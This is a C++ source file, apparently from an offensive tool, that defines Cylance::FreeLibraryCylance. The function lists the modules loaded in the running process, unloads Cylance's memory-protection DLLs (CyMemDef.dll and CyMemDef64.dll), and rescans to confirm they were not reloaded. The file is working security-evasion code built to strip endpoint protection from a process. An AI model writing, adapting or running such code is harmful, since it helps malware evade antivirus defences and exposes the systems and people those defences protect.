#include "Cylance.h"

bool Cylance::FreeLibraryCylance() {
	bool remove = false;
 	std::vector<MemInfoModule> curModules = MemInfo::CurrentLoadedModules();
	for (MemInfoModule m : curModules) {
#ifdef DEBUG
		std::cout << "Testing module: " << m.modName << std::endl;
#endif // DEBUG

		std::string strName = m.modName;
		if (hasEnding(strName, "CyMemDef.dll") || hasEnding(strName, "CyMemDef64.dll")) {
			remove = MemInfo::RemoveLoadedModule(m.hMod);
#ifdef DEBUG
			std::cout << "Removing module: " << m.modName << std::endl;
#endif // DEBUG
		}
	}
	// if for some reason we couldn't remove it
	// return false and move on, don't rescan modules
	if (!remove) {
		return false;
	}

	// if we did remove it, let's check again
	curModules = MemInfo::CurrentLoadedModules();
	for (MemInfoModule m : curModules) {
		std::string strName = m.modName;
		// the DLL was reloaded into the process
		if (hasEnding(strName, "CyMemDef.dll") || hasEnding(strName, "CyMemDef64.dll")) {
#ifdef DEBUG
			std::cout << "Cylance Reloaded into Process" << std::endl;
#endif // DEBUG
			return false;
		}
	}
	return true;
}

bool hasEnding(std::string const& fullString, std::string const& ending) {
	if (fullString.length() >= ending.length()) {
		return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
	}
	else {
		return false;
	}
}